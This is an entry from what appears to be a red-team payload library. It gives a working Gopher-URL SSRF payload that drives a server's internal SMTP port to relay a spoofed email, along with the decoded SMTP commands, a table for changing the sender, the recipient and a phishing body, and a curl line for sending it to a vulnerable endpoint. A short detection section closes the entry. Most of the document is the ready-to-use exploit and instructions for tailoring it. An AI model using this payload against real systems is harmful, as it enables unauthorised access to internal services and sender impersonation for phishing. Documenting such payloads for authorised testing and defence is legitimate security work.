---
id: 740a148d-67f9-4dae-996c-44b234ed97f2
name: gopher-smtp-spoofing-payload
type: code
language: text
verified: true
created_at: '2023-04-06T03:56:37.903635+00:00'
updated_at: '2023-04-10T20:24:03.282273+00:00'
platforms:
  - Web
tags:
  - gopher
  - ssrf
  - smtp-spoofing
validated: true
---

# gopher-smtp-spoofing-payload

## Code

```text
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT

will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AH

You didn't say the magic word !


.
QUIT
```

## Description

This is a crafted Gopher URL payload designed to exploit SSRF vulnerabilities by encoding SMTP commands for spoofing emails via an internal server. When passed to a vulnerable endpoint like ssrf.php, it forces the server to connect to localhost:25 and relay a spoofed message, allowing attackers to impersonate senders and deliver phishing content.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| hacker@site.com | Spoofed sender email address (encoded in MAIL FROM and From header) | attacker@evil.com |
| victim@site.com | Recipient email address (encoded in RCPT TO and To header) | user@target.com |
| AH AH AH | Email subject (URL-encoded) | Custom Subject |
| You didn't say the magic word ! | Email body content (URL-encoded) | Phishing message with link |

To customize, decode the % encodings (e.g., %250d%250a is \r\n), modify the SMTP commands, and re-encode for the Gopher URL.

## Usage

Embed this payload in an HTTP request to the SSRF endpoint, such as via curl: curl "http://target/ssrf.php?url=<paste payload here>". Use in red team engagements to test SSRF protections and simulate internal service abuse. Verify success by checking the recipient's email or target SMTP logs.

## Detection

- WAF rules blocking gopher:// schemes or URL-encoded payloads with SMTP commands (e.g., HELO, MAIL FROM).
- Server logs showing web app processes connecting to localhost:25 or unusual SMTP relays.
- Email security gateways flagging spoofed From addresses or anomalous internal relays.
- Network monitoring for non-standard protocol usage in web traffic.

## Related

- [[procedures/Exploit-SSRF-with-Gopher-for-SMTP-Spoofing]]
- [[curl-gopher-ssrf-smtp-spoof]]
